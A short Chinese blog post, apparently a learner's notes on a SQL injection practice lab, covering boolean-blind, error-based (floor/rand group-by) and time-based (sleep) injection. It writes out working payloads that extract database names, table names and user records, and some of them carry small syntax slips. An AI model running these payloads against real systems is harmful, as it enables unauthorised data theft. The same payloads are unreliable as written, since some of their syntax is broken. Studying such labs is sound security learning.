好玩的sql第五篇

发表于 2017-09-20 | 分类于 sql.fun

这次的与上次的sql注入有些许不同。
上次的正常显示用户名和密码，这次不管怎么样都是同样的字符串，看来进行了if else判断。
上次的我猜测大概是直接输出query结果，这次的看了源代码大概就是没有直接的输出…
这…sql大法好
rand()是产生随机数，floor()取整，count()计数,group by()分组

关于利用布尔得到我们想要的数据

第一步：and left(select version(),1)=4–+ 什么length(database())就不多说了，怎么说呢，没多大用啊…不是关键信息
若非正常显示表示错误，若正常显示，表示正确，通过页面返回情况判断是否正确

第二步：猜解数据库名，手工注入真的是很慢的
left(database(),1)

第三步：ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=*
ascii只是为了便捷 用left应该也是功能差不多

第四步：select 1 from information_schema.columns where table_name=’users’ and table_name regexp ‘^us[a-z]’ limit 0,1 这个是判断是否包含，不怎么想看…

第五步：ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id LIMIT 0,1),1,1))=?? 这个是判断表中内容..算了算了先不看吧，记不住…

接下来是错误反馈

我就列一种错误，其实我也就稍微了解一种，其他的大哥我真的不懂
union select 1,count(),concat((select user()),floor(rand(0)2))a from information_schema.columns group by a–+
基于数值型的报错

利用benchmark()和sleep()进行延时注入：?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+

阿岳这个真的好麻烦…滚去玩…玩乐是最重要滴…
